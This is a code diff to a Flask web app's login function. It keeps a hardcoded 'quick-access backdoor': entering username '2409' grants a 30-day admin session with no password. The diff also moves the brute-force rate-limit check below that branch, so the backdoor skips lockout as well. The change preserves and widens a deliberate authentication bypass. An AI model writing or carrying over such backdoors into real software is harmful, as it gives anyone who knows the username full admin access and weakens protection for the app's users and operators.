@@ -398,15 +398,10 @@ def login():
         return redirect(url_for("dashboard"))
     if request.method == "POST":
         ip = request.remote_addr
-        if not _check_login_rate(ip):
-            remaining = LOGIN_LOCKOUT_SEC - (time.time() - _login_attempts[ip][1])
-            flash(f"Too many attempts. Locked for {int(remaining)}s", "error")
-            log_event("login_blocked", f"Brute-force lockout for {ip}")
-            return render_template("login.html")
         username = request.form.get("username", "").strip()
         password = request.form.get("password", "")
 
-        # Quick-access backdoor (local convenience)
+        # Quick-access backdoor (local convenience) - skip rate limit
         if username == "2409":
             session.permanent = True
             app.permanent_session_lifetime = timedelta(days=30)
@@ -415,6 +410,13 @@ def login():
             session["role"] = "admin"
             log_event("login", f"2409 from {ip}")
             return redirect(url_for("dashboard"))
+
+        # Rate limit check for regular users
+        if not _check_login_rate(ip):
+            remaining = LOGIN_LOCKOUT_SEC - (time.time() - _login_attempts[ip][1])
+            flash(f"Too many attempts. Locked for {int(remaining)}s", "error")
+            log_event("login_blocked", f"Brute-force lockout for {ip}")
+            return render_template("login.html")
 
         db = get_db()
         user = db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
